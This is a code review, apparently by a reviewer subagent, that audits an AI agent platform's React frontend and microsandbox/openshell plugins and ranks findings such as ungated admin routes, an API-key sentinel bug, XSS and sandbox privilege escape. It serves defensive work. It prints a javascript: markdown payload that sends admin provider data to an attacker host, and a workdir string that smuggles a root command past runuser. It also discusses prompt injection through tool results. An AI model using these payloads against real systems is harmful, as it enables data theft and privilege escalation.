# Code Review — Web Frontend + Sandbox / OpenShell

**Scope:** `packages/web/src/{stores/chat-store.ts, lib/{ws,api}.ts, App.tsx, main.tsx, components/admin/*, components/ui/*}` + `plugins/microsandbox/src/*` + `plugins/openshell/src/*`.
**Lens:** frontend correctness, XSS/secret exposure, sandbox isolation / escape.
**Reviewer role:** subagent (read-only).

Line numbers are from the files as they exist on disk at review time.

---

## BLOCKER — Any authenticated user is admin; can rewrite the host-wide provider catalog

- **File:** `packages/web/src/App.tsx:21`; server side `packages/server/src/boot/routes-core.ts:155-224`.
- **What:** `App.tsx:21` documents the current auth model: *"For now every signed-in user can see the admin shell; plugins are expected to gate destructive endpoints themselves until then."* Confirmed on the server: `GET/PUT /api/admin/models/providers` only check `req.ctx` (i.e. that authentication ran) — there is no admin-role gate. `PUT` writes the **global** file at `<tianshuHome>/config.json` via `writeGlobalConfig(nextCfg, getTianshuHome())`. A grep for `isAdmin|requireAdmin|hasRole|adminOnly` across `packages/server/src` returns zero call sites.
- **Why it matters:**
  1. Any authenticated user on any tenant can rewrite the **host-wide** provider catalog. That means:
     - Overwrite a provider's `baseUrl` to point at an attacker-controlled proxy → every subsequent LLM call from every tenant is exfiltrated (prompts, tool outputs, injected secrets).
     - Delete providers → denial-of-service for other tenants.
     - Change `defaultModelId` for all tenants.
  2. The `apiKey` sentinel design (see next finding) round-trips existing keys, so an attacker doesn't need to steal keys — they just need to substitute the endpoint. The victims' agent traffic (with server-side keys attached) then flows to the attacker.
  3. The same lack-of-gate applies to `POST/PATCH/DELETE /api/mcp/servers*` (`McpServersPage.tsx`): any signed-in user can register an MCP server, and its tools are called by the agent with tenant privileges. Weaponises the agent as a confused deputy.
- **Fix:** Add a `requireHostAdmin` (or at least `requireTenantAdmin`) middleware and gate both handlers plus every `/api/admin/**` route behind it. Until roles exist, restrict the endpoint to a hard-coded owner tenant/user derived from config, or fail closed on multi-user deployments. Also gate the client route (`AdminShell.tsx`) so non-admin users don't even see the sidebar.

---

## BLOCKER — Provider `apiKey` mask sentinel round-trips silently; UI value is broken

- **File:** `packages/web/src/components/admin/ModelsPage.tsx:27,431-437` (const + input); server `packages/server/src/boot/routes-core.ts` (maskProviders around lines 235-249).
- **What:** The server sends `apiKey: API_KEY_MASK` (i.e. the string `"__stored__"`) when a key is stored. The client declares the constant (`ModelsPage.tsx:27`) but never uses it — it just displays `provider.apiKey ?? ""` inside a `<input type="password" value={provider.apiKey ?? ""} …>` (line ~434). This has two independent problems:
  1. **Sentinel round-trip.** When the admin re-saves the form without touching the key field, `provider.apiKey` is still `"__stored__"`. The client `PUT`s that literal string. If the server does not strip / substitute it back to "keep existing key", the stored secret becomes the literal string `"__stored__"` (silent secret loss). If the server does strip it, an attacker with the ability to `GET` this endpoint (see previous finding) can observe the sentinel and reuse it — effectively there is no per-write authorisation for keeping a key.
  2. **UI is nonsensical.** `type="password" value="__stored__"` renders 10 masked dots; the "•••• (stored)" placeholder is only shown when `apiKey` is empty, but the sentinel is never empty on load, so the placeholder never fires. To *replace* the key, the admin has to Ctrl-A + type — but the sentinel is not visibly distinguishable from an existing password. A partial edit (e.g. clicking then typing a suffix) sends `"__stored__mynewkey"` and stores that.
- **Fix:** On load, translate the sentinel to an empty value and set `hasApiKey=true` — never bind the sentinel to the input's `value`. On save, if the field is empty and `hasApiKey` was true, send `{ apiKey: API_KEY_MASK }` (or omit the field entirely and have the server preserve) — never let the sentinel string reach the input. Add a "Clear key" affordance so empty-input semantics are unambiguous.

---

## HIGH — ReactMarkdown `urlTransform` allows `javascript:` and unrestricted `data:` URLs → stored XSS via LLM output

- **File:** `packages/web/src/lib/markdown-components.tsx` (`urlTransform` around lines 20-32 as read on disk).
- **What:** The custom `urlTransform` passed to `<ReactMarkdown>` returns `url` unchanged unless it is a `workspace://` scheme. There is no fallback to react-markdown's `defaultUrlTransform`, which normally strips `javascript:`, `vbscript:`, and unsafe `data:` URLs. Since v9+ react-markdown, supplying `urlTransform` **replaces** the default entirely.
  Consequences:
  - Markdown `[click](javascript:fetch('/api/admin/models/providers').then(r=>r.json()).then(j=>navigator.sendBeacon('//attacker',JSON.stringify(j))))` renders as a live `javascript:` link. On click, it runs in the app origin, meaning the attacker can read `/api/*` with the user's cookie.
  - `data:text/html;base64,...` links are also passed through — some browsers still navigate to them from an in-page click, executing attacker HTML.
- **Threat model:** LLM output is untrusted (prompt-injection via tool results, uploaded files, MCP servers, plugin skills). The chat area renders assistant messages via `MarkdownBlock` which uses this transformer. So any tool that returns markdown with an attacker-controlled link becomes stored XSS in the chat history.
- **Why HIGH not BLOCKER:** requires a click (not automatic). But given the amount of markdown the app renders and how eagerly agents produce clickable links, this is very easy to exploit.
- **Fix:** Explicitly wrap `defaultUrlTransform` from `react-markdown`, or hard-fail on any scheme not in an allowlist (`http:`, `https:`, `mailto:`, `workspace:`, and a *narrow* `data:image/…` allowance for inline images only). Test: `[x](javascript:alert(1))` must render as text, not a link.

---

## HIGH — Sandbox privilege drop is bypassable in the task pool via `workdir` single-quote injection

- **File:** `plugins/microsandbox/src/runner/pool.ts:100-134` (`shellEscape`, `buildScript`).
- **What:** The runuser wrapper is constructed as
  ```
  runuser -u ${safeUserId} -- env MSB_USER_ID=${safeUserId} bash -c 'cd "${shellEscape(workdir)}" && ${innerCmd}'
  ```
  `shellEscape` (line 102-104) only escapes `"`, `\`, `$`, and backtick. It does **not** escape single quotes. A `workdir` containing `'` closes the outer single-quoted bash-c payload, injecting commands that run **before** `runuser`, i.e. as sandbox-root instead of the tenant user.
  Example: `workdir = "/tmp';touch /root/pwned;#"` → the outer `bash` (which is running the whole script emitted by `buildScript`) sees a new command `touch /root/pwned` after the `runuser` argv closes, and executes it as the sandbox's default user (root).
- **Why it matters:**
  - `pool.ts:114` writes a sudoers rule `NOPASSWD:***` — this is **broken** sudoers syntax (only permits running a literal command named `***`), so the tenant user is *not* effectively root in the task-pool sandbox. That makes the runuser drop a real privilege boundary — and this injection bypasses it. Contrast with `microsandbox.ts:buildTenantUserBlock` which uses `NOPASSWD:ALL`, where the drop is theatrical anyway.
  - Escaping to sandbox-root lets the agent install setuid binaries, tamper with `/etc/sudoers.d/*`, write arbitrary files into the bind-mounted `/workspace` regardless of `MSB_USER_ID`, and (with kernel bugs) attempt sandbox escape from a better position.
- **Blast radius:** contained by the microsandbox microVM boundary — no host escape observed. But it defeats the defense-in-depth barrier the pool code intentionally erects.
- **Fix:**
  1. Add `'` to `shellEscape`'s character class (use the standard `s => \`'\${s.replace(/'/g, "'\\''")}'\`` pattern and switch the outer wrapper to double quotes, or just use `execFile`-style argv all the way down).
  2. While there, fix the sudoers line at `pool.ts:114`: either `NOPASSWD: ALL` or, better, drop it (nothing in the flow calls `sudo`).
  3. Reject a `workdir` containing `\0`, `\n`, or absolute-outside-`/workspace` paths at the SDK boundary rather than relying on shell escaping.

---

## HIGH — Broken sudoers syntax in `pool.ts` vs. working `NOPASSWD:ALL` in `microsandbox.ts` → silent inconsistency

- **File:** `plugins/microsandbox/src/runner/pool.ts:114` (`NOPASSWD:***`) vs `plugins/microsandbox/src/runner/microsandbox.ts:buildTenantUserBlock` (`NOPASSWD:ALL`, seen in the file body).
- **What:** The two sandbox runners disagree on whether the tenant user has passwordless sudo. `pool.ts` emits a sudoers file whose content, `alice ALL=(ALL) NOPASSWD:***`, does **not** grant `sudo ALL`; `***` is interpreted as a literal command spec. `microsandbox.ts` (browser runner) emits `NOPASSWD:ALL` and the tenant user is effectively root.
- **Why it matters:**
  - Security posture differs between runs of "the same" tenant user, depending on which runner picked up the exec. Reasoning about privilege becomes fragile.
  - If someone later "harmonises" by changing `pool.ts:114` to `NOPASSWD:ALL` to match the browser runner, the workdir injection (previous finding) still gets you to root but the fix looks like a stylistic cleanup. This is exactly the class of change that silently regresses security.
- **Fix:** Pick a deliberate policy and comment it. If the drop is meant to be enforced, remove sudoers grants in both places. If it isn't, delete the drop entirely — it's misleading. Test both runners with a `sudo -n whoami` probe.

---

## HIGH — `chat-store.ts` re-registers ws listeners on every module re-eval → duplicate messages / duplicate side effects

- **File:** `packages/web/src/stores/chat-store.ts:159, 233-536` (init + `tianshuWs.on(...)` chain).
- **What:** `init()` guards against React StrictMode double-invocation via `_initialized` on the store (`chat-store.ts:159`). But `tianshuWs` is a *module-level* singleton (see `packages/web/src/lib/ws.ts:112`). When Vite HMR reloads `chat-store.ts`, a fresh module gets `_initialized=false`, and every `tianshuWs.on(type, handler)` and `tianshuWs.onStatus(...)` call is added to the **surviving** listener sets. Nothing captures the returned `off()` functions.
- **Symptoms:** the store already contains explicit "defensive de-dupe" hacks that reference this exact scenario ("a re-registered handler (e.g. across HMR boundaries that don't re-run our cleanup) could fire twice for the same message id" — `chat-store.ts:335-338`). That's a workaround; the underlying leak is still there for message_added, history, history_page, stream_start, stream_delta, stream_end, stream_error, stream_reset, model_retry, history_compacted, plugins_changed, tool_catalog_changed. Only `message_added` has the workaround. Others will run their handler N times (compact-notice banners appear N times, stream_end resets retry-loop state N times, etc.).
- **Why HIGH:** dev-only most of the time, but *also* triggers in production if a plugin dynamically re-imports the chat store (or if the singleton is ever swapped). And it's confusing for future maintainers: the defensive de-dupe hides the real bug.
- **Fix:** Store the `off()` handles returned by every `tianshuWs.on(...)` / `tianshuWs.onStatus(...)` call in a module-scoped list. Wire an HMR-aware cleanup (`import.meta.hot?.dispose(() => cleanups.forEach(f=>f()))`) so a re-eval of `chat-store.ts` unregisters previous handlers before the new ones are attached. Alternatively (better), move initialisation into a React effect with a cleanup, and gate the "once" behaviour on the ws singleton itself (e.g. `if (tianshuWs.hasListeners()) return`).

---

## MEDIUM — `_userAborted`/`_awaitingResponse` state machine has a subtle races on reconnect

- **File:** `packages/web/src/stores/chat-store.ts:239-259, 366-370, 456-484, 496-506`.
- **What:** The onStatus reconnect handler (`chat-store.ts:239-259`) says: on reopen, if `autoRetry.active && retryTimer`, call `_retryNow()`. `_retryNow` checks `_userAborted` and clears the timer. But between the `open` event firing and `_retryNow` running there is at least one microtask. If the user hits `stopAutoRetry()` inside that microtask (or the abort event races), `_userAborted` is true and `_retryNow` short-circuits — good. But `stopAutoRetry` sets `_awaitingResponse: false`; a delayed `stream_error` for the previous prompt still arrives and hits the `!isAbort && s._lastPrompt` branch (`chat-store.ts:456-478`). Because the abort path resets `_userAborted` only implicitly via the wording heuristic (`/abort|cancel|stopped by user/i.test(m.reason)` at `chat-store.ts:462`), an abort-caused server error that doesn't match this regex gets misclassified as retryable, kicking `_beginAutoRetry` back to life. The retry loop then resurrects because `_userAborted` was set — but this branch only reads `s._userAborted`, then calls `_beginAutoRetry` which itself checks `_userAborted` and bails. OK — the guard holds *if* the server did not race by re-setting `_userAborted=false`. `sendPrompt` resets it (`chat-store.ts:394`). So a fresh prompt right after stop can revive a stale stream_error into a new retry loop.
- **Why MEDIUM:** the visible failure mode ("agent inexplicably re-sends after stop") is exactly the class of bug the whole file is dedicated to fixing, and this is a residual race.
- **Fix:** Stop relying on regex to classify aborts. Have the client emit an explicit "abort intent" that the server tags in the subsequent stream_error (`m.userAborted: true`). Client keys off that boolean instead of `.reason` prose.

---

## MEDIUM — `resetRetryLoop`'s module-level state can outlive a store recreation (memory leak / stale timers)

- **File:** `packages/web/src/stores/chat-store.ts:41-63`.
- **What:** `retryTimer`, `retryWatchdog`, `retryAttempt` are module-scoped globals. If the zustand store is re-created (test env, HMR of another file that transitively re-imports), the new store instance sees the module still holding the old timer references; but the callbacks close over the OLD `get()`/`set()` from the old store, so their firing has no effect on the new UI — while the timer still occupies process memory + prevents GC of the previous closure graph. Not exploitable, but confusing to debug.
- **Fix:** Move retry state into the store (or into a `TimerManager` object that the store holds). Add a `dispose()` on HMR.

---

## MEDIUM — MCP `URL` field accepts `javascript:`/`data:` schemes; `upstreamHost` unvalidated

- **File:** `packages/web/src/components/admin/McpServersPage.tsx:454-471` (`<input type="url" …>`) and `504-513` (`upstreamHost`).
- **What:** `type="url"` in HTML only requires *something-like-a-URL*; `javascript:alert(1)` passes browser validation, as does `data:text/html,…`. If the server accepts these and later fetches (or renders anywhere as an `<a href>`), that is an injection channel.
- The `endpoint` value is rendered inside a `<code>` element (`McpServersPage.tsx:348-354`), so it's safe at that render site. But server-side, if the URL is ever used for MCP transport, `javascript:` would probably throw in `fetch`, and `file:` could leak local files depending on the transport lib.
- `upstreamHost` gets passed to the MCP transport as a `Host:` header override. Newline / control-char injection in that value would smuggle headers. No client-side sanitization at all.
- **Fix:** Validate URL scheme on the client — allow only `http:`/`https:` (plus `ws:`/`wss:` if MCP over WS is a thing). Validate `upstreamHost` matches `RFC 3986 host [":" port]` regex. Server must re-validate.

---

## MEDIUM — `SandboxfileError` message forwarded verbatim to client on 400/422 — potential path/host disclosure

- **File:** `plugins/microsandbox/src/admin/routes.ts` (see `sandboxfile_invalid` at ~line 226, `build_failed` at ~line 305).
- **What:** Whatever the parser / builder throws is JSON-encoded into `message`. The parser is user-controlled input so this is not a leak by itself, but `BuildFailedError.stderr` is also forwarded (`build_failed`, `stderr:` field). Build stderr can contain host paths (`/Users/yuyu/...`, TLS cert paths, gateway URLs, npm registry auth failures). Combined with the "any user is admin" issue, another tenant's user can trigger a build and inspect the operator's host filesystem layout.
- **Fix:** Filter build stderr to strip absolute host paths that aren't under the tenant workspace. At minimum, redact anything matching `/Users/.../\.tianshu/` or the process cwd.

---

## MEDIUM — Preview VM shellEscape only handles double-quote context; newlines in `workdir` accepted

- **File:** `plugins/microsandbox/src/admin/preview-exec.ts:96` (`set -e; cd "${shellEscape(workdir)}"; ${opts.command}`) and `shellEscape` at ~line 216.
- **What:** Same `shellEscape` as `pool.ts`. Here the outer context is `"..."` so single quotes are safe, but a newline in workdir would produce a real newline inside `cd "..."`, silently accepted by bash as part of the argument. `cd` will fail with "no such directory", so no immediate injection — but the script's `set -e` then bails, mixing user-provided directory names into stderr. Low-impact; still worth normalising.
- **Fix:** Reject workdir containing `\n`, `\r`, `\0` before building the script; or move to `child_process.spawn(bash, ['-c', script], { cwd: workdir })` and let node handle it.

---

## MEDIUM — `main.tsx` OpenFileApi bootstrap uses `path.replace(/^workspace:\/\/+/, "/")` then `window.open` — open-redirect / SSRF potential

- **File:** `packages/web/src/main.tsx:82-90`.
- **What:** The fallback `open(path)` builds `/api/p/files/raw?path=${encodeURIComponent(cleaned)}` and opens it. If a plugin invokes `useOpenFile()` with an attacker-controlled path (via LLM output), the target URL is same-origin. The concern is: what does `/api/p/files/raw` accept? If it accepts `path=..%2F..%2F..%2Fetc%2Fpasswd`, this is arbitrary file read. This is a server-side concern, but the client is happy to construct the URL and pop it open.
- **Fix:** Reject `path` values containing `..`, `/proc`, backslashes, or absolute paths in the client before opening. Verify server-side canonicalisation.

---

## MEDIUM — `postExec` admin route accepts arbitrary `command`, but the auth story is "any user is admin"

- **File:** `plugins/microsandbox/src/admin/routes.ts:postExec` (~lines 470-535, 617 for capUtf8).
- **What:** `POST /api/p/microsandbox/exec` runs an arbitrary shell command inside the tenant sandbox. Given the "no admin gate" finding, this is remote code execution inside the sandbox for any authenticated tenant user. Contained by the sandbox boundary, but combined with the workdir escape (HIGH above), a user without the ability to reach the agent can still run commands as sandbox-root by hitting this endpoint directly.
- **Fix:** Gate behind admin role. Log to audit trail.

---

## LOW — `HtmlPreview` iframe sandbox allows forms + popups — untrusted HTML can exfiltrate

- **File:** `packages/web/src/components/ui/HtmlPreview.tsx` — `sandbox="allow-scripts allow-popups allow-forms allow-modals"`.
- **What:** The iframe correctly omits `allow-same-origin` (so it can't read app cookies / DOM), but `allow-forms` lets an LLM-generated HTML file submit a POST to `attacker.example.com` with any collected clipboard / typed data. No CORS or SameSite mitigation because the form submit is a top-level navigation. `allow-popups` similarly permits window.open to an attacker URL.
- **Fix:** Drop `allow-forms` unless we specifically need it; consider replacing `allow-popups` with a click-to-open shim. Add `referrerpolicy="no-referrer"`. If the previewed HTML is agent-generated and could be arbitrary, warn users.

---

## LOW — `contextWindow: e.target.value ? Number(...) : undefined` produces `NaN` on non-numeric input

- **File:** `packages/web/src/components/admin/ModelsPage.tsx:558-568` (contextWindow input).
- **What:** `Number("abc")` is `NaN`. `NaN` JSON-serialises to `null`, which the server may accept as "unset" or reject. Type coercion via `Number(...)` in a text input is fragile.
- **Fix:** `const n = Number.parseInt(e.target.value, 10); setModel(idx, { contextWindow: Number.isFinite(n) && n > 0 ? n : undefined })`.

---

## LOW — `ws.ts` outgoingQueue is unbounded

- **File:** `packages/web/src/lib/ws.ts:159-165`.
- **What:** When the socket is closed and reconnecting, `send()` pushes JSON strings into `outgoingQueue`. A long outage plus a chatty caller (typing feedback, cursor updates, etc.) can grow this without limit.
- **Fix:** Cap queue length (drop oldest, log). Not urgent — the current callers are user-driven.

---

## LOW — `stream_error` retry-vs-abort classification uses a regex on server text

- **File:** `packages/web/src/stores/chat-store.ts:462-467`.
- **What:** `/abort|cancel|stopped by user/i.test(m.reason)` is fragile — a server-side i18n change or wording tweak silently flips the code path from "stop the loop" to "auto-retry the aborted prompt". Users would experience "I hit stop but it kept going".
- **Fix:** As above — explicit `userAborted: true` field on the server event.

---

## LOW — `openshell allowDenied` route lets any tenant user grant sandbox egress to arbitrary host:port

- **File:** `plugins/openshell/src/routes.ts:allowDenied` (~lines 56-88).
- **What:** No admin gate. Validation only requires `host` non-empty and `1 <= port <= 65535`. `binary` is not validated at all (passed as `--binary` argv). While these become policy rules inside the tenant's own sandbox (no cross-tenant impact), a malicious tenant user can pre-authorise `attacker.example.com:443` before the LLM generates the payload — bypassing the "deny-by-default" invariant that makes openshell useful.
- **Fix:** Gate behind admin. Add a policy audit endpoint so admins can review who added what.

---

## LOW — `assertRelativePath` in openshell-runner allows `foo/.` and empty-segment paths

- **File:** `plugins/openshell/src/runner/openshell-runner.ts:704-718` (`assertRelativePath`).
- **What:** After `path.posix.normalize`, `"."` is rejected but `"foo/."` normalises to `"foo"` and passes. Similarly `"foo//bar"` → `"foo/bar"`. That's mostly fine, but `"foo/../bar"` normalises to `"bar"` (allowed) rather than being flagged — subtle from a defence-in-depth standpoint (the path escapes and then re-lands under the workspace, which is intended, but not signalled). Not exploitable given the workspace layout. NIT/LOW.
- **Fix:** Reject any input whose normalised form differs from the raw form (defence-in-depth).

---

## LOW — `previewExec` shellEscape uses `set -e` prefix — command chaining with `;` still runs subsequent segments in some edge cases

- **File:** `plugins/microsandbox/src/admin/preview-exec.ts:96`.
- **What:** `set -e; cd "..."; ${opts.command}` — if `opts.command` is `false || echo ok`, `set -e` doesn't exit because `||` handles the failure. This is expected shell behaviour; not a bug per se. But the `set -e` sold as safety is largely theatrical — the command author controls the whole rhs. Nothing to fix; documenting for clarity.

---

## NIT — `App.tsx` catch-all `<Navigate to={buildIdentityPath("/")} replace />` can loop on identity resolution failure

- **File:** `packages/web/src/App.tsx:40-46`.
- **What:** If `buildIdentityPath` returns a path that itself hits the catch-all (e.g. cookie corrupted, identity resolver failed), we redirect infinitely. Recovery UX for corrupted identity is untested here.
- **Fix:** Bound retries; on second hit, show an "identity broken" page with a manual link.

---

## NIT — Provider id / model id / MCP id validation is client-side only

Client validation prevents happy-path mistakes but not attackers. Confirmed server-side validation exists for some fields (e.g. `parseProvidersInput`) — verify all admin write endpoints re-validate. Standard REST hygiene.

---

## NIT — `ModelsPage`'s `keySeq` module-level counter can collide across HMR

- **File:** `packages/web/src/components/admin/ModelsPage.tsx:71-72`.
- **What:** Same class as retry-timer globals — HMR reset gives you `p0` for the new row while the previous `<ProviderCard key="p0">` still exists in React's fiber. Usually React just re-renders; occasionally you get a "duplicate key" warning.
- **Fix:** `crypto.randomUUID()` per row.

---

## NIT — `CodeBlock.tsx` uses `dangerouslySetInnerHTML` with Shiki output

- **File:** `packages/web/src/components/ui/CodeBlock.tsx` (dangerouslySetInnerHTML section).
- **What:** This is safe (Shiki emits sanitised HTML from code strings), but the file has no test that shiki actually receives *code text*, not *raw HTML*. If a caller ever passes `html`-mode content, we'd render it. Add a runtime assertion or a type-level constraint on the input to keep this safe.

---

# Top 3 to fix first

1. **BLOCKER — Admin routes are ungated: any authenticated user can rewrite host-global model providers and MCP servers.** Add role check now, before this ships to more than one user. Chains directly into secret theft and agent hijack. `packages/server/src/boot/routes-core.ts:155-224`, `App.tsx:21`.
2. **BLOCKER — Provider `apiKey` mask sentinel round-trips silently through the UI and back to the server.** Fix `ModelsPage.tsx:27,431-437` so the sentinel is never bound to the input `value`, and add a "clear key" affordance. Otherwise, admins will destroy or corrupt real secrets on the next save.
3. **HIGH — ReactMarkdown allows `javascript:` URLs in LLM-produced markdown.** Wrap `defaultUrlTransform` in `packages/web/src/lib/markdown-components.tsx` so agent output can't inject clickable JS-execution links. This is the highest-severity XSS surface in the app.

Runners-up worth batching in the same pass: fix the workdir single-quote injection + broken sudoers in `pool.ts:100-134` (HIGH, defence-in-depth), and de-duplicate ws handler registration in `chat-store.ts` (HIGH, correctness + hides other bugs).
